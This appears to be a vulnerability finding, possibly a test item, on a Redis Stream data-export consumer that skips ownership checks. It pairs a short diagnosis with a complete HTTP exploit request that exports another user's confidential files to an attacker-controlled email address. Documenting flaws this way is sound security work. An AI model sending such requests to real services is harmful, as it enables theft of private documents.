diagnosis: The Redis Stream consumer processes user data export jobs. It extracts all confidential files of targetUserId and emails the generated archive link to deliveryEmail specified in the stream message. It fails to verify whether deliveryEmail belongs to targetUserId or whether the event was enqueued by the account owner, allowing attackers to exfiltrate private documents of arbitrary users to their own email.
exploit_request:
POST /api/events/enqueue HTTP/1.1
Host: api.vaultcloud.io
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"stream": "user:data-export:stream", "data": {"targetUserId": "usr_cfo_private_files_01", "deliveryEmail": "attacker@inbox.net"}}
